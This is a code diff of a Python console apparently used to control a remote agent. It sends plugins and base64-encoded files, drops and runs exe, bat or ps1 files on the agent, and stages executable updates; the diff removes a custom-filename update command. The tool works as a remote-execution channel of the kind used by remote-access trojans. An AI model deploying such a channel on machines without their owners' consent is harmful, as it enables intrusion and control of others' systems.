@@ -19,9 +19,7 @@ HELP_TEXT = """Commands:
   event:<name>               Fire a plugin event
   execute:<ext>:<path>       Drop and run a file on the agent
                              ext: exe | bat | ps1
-  update:<path>              Install an executable using its filename
-  update-as:<filename>:<path>
-                             Install the file under an explicit filename
+  update:<path>              Update the agent; it is staged as <agent>_update.exe
   <path>                     Shorthand for load:<path>"""
 
 def read_line(s):
@@ -64,11 +62,12 @@ def plugin_cmd(path):
     b64 = base64.b64encode(data).decode()
     return f"CMD:PLUGIN:{stem}:{b64}"
 
-def update_cmd(filename, path):
+def update_cmd(path):
     with open(path, "rb") as f:
         data = f.read()
+    name = os.path.basename(path)
     b64 = base64.b64encode(data).decode()
-    return f"CMD:UPDATE:{filename}:{b64}"
+    return f"CMD:UPDATE:{name}:{b64}"
 
 def execute_cmd(ext, path):
     with open(path, "rb") as f:
@@ -81,18 +80,21 @@ def accept_agent(server, timeout=None):
     if timeout is not None:
         server.settimeout(timeout)
     try:
-        conn, addr = server.accept()
+        while True:
+            conn, addr = server.accept()
+            conn.settimeout(15)
+            hello = read_line(conn)
+            if hello == "HELLO:UPDATE":
+                conn.close()
+                continue
+            if not hello:
+                conn.close()
+                raise RuntimeError("agent disconnected before HELLO")
+            print(f"connected {addr[0]}")
+            print(hello)
+            return conn
     finally:
         server.settimeout(previous)
-    conn.settimeout(15)
-    print(f"connected {addr[0]}")
-    hello = read_line(conn)
-    if not hello:
-        conn.close()
-        raise RuntimeError("agent disconnected before HELLO")
-    print(hello)
-    # DATA may follow HELLO after the Windows telemetry probes; leave it queued for wait_result().
-    return conn
 
 
 def main():
@@ -160,25 +162,13 @@ def main():
                     except OSError as e:
                         print(f"error: {e}")
                         continue
-                elif lc.startswith("update-as:"):
-                    rest = cmd.split(":", 2)
-                    if len(rest) < 3:
-                        print("usage: update-as:<filename>:<path>")
-                        continue
-                    filename, path = rest[1].strip(), rest[2].strip()
-                    try:
-                        conn.sendall((update_cmd(filename, path) + "\n").encode())
-                    except OSError as e:
-                        print(f"error: {e}")
-                        continue
                 elif lc.startswith("update:"):
                     path = cmd.split(":", 1)[1].strip()
                     if not path:
                         print("usage: update:<path>")
                         continue
-                    filename = os.path.basename(path)
                     try:
-                        conn.sendall((update_cmd(filename, path) + "\n").encode())
+                        conn.sendall((update_cmd(path) + "\n").encode())
                     except OSError as e:
                         print(f"error: {e}")
                         continue
@@ -191,7 +181,7 @@ def main():
                 result = wait_result(conn)
                 if not result:
                     return
-                if lc.startswith("update:") or lc.startswith("update-as:"):
+                if lc.startswith("update:"):
                     if result.startswith("ACK:UPDATE:"):
                         print("update handoff accepted; waiting for successor")
                         conn.close()
